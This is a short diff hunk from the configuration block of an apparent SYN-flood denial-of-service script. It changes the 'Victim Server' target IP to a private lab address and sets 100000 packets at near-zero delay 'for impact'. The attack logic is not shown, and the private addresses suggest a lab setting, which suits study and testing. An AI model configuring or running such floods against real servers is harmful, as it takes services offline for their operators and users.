@@ -6,7 +6,7 @@ import time
 import sys
 
 # --- Configuration ---
-TARGET_IP = "10.0.0.4"               # Replace with the Victim Server's Private IP
+TARGET_IP = "192.168.56.103"               # Replace with the Victim Server's Private IP
 TARGET_PORT = 80                     # Replace with the Victim Server's listening port (e.g., 80 for HTTP, 22 for SSH)
 PACKET_COUNT = 100000                # Number of SYN packets to send (adjust as needed for impact)
 DELAY_BETWEEN_PACKETS = 0.0001       # Delay in seconds between sending packets (0 for max speed)
